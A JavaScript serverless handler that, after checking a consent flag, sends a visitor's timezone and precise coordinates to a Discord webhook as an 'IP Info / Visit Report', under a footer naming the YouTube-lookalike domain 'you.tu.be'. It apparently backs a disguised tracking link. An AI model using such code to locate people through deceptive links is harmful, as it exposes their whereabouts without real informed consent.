
export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({
      error: "Method not allowed"
    });
  }

  const webhook = process.env.DISCORD_WEBHOOK_URL;

  if (!webhook) {
    return res.status(500).json({
      error: "Webhook not configured"
    });
  }

  const { consent, location, timezone } = req.body || {};

  if (consent !== true) {
    return res.status(403).json({
      error: "Consent required"
    });
  }

  const validLocation =
    location &&
    Number.isFinite(location.latitude) &&
    Number.isFinite(location.longitude) &&
    Math.abs(location.latitude) <= 90 &&
    Math.abs(location.longitude) <= 180;

  const fields = [
    {
      name: "Analytics",
      value: "Visitor consented",
      inline: true
    },
    {
      name: "Timezone",
      value: String(timezone || "Unknown").slice(0, 100),
      inline: true
    },
    {
      name: "Location",
      value: validLocation
        ? `[View on Google Maps](https://www.google.com/maps?q=${location.latitude},${location.longitude})`
        : "Not shared",
      inline: false
    }
  ];

  const response = await fetch(webhook, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      embeds: [{
        title: "IP Info / Visit Report",
        color: 15158332,
        fields,
        footer: {
          text: "you.tu.be | Consented analytics"
        },
        timestamp: new Date().toISOString()
      }]
    })
  });

  if (!response.ok) {
    return res.status(502).json({
      error: "Discord notification failed"
    });
  }

  return res.status(200).json({
    success: true
  });
}
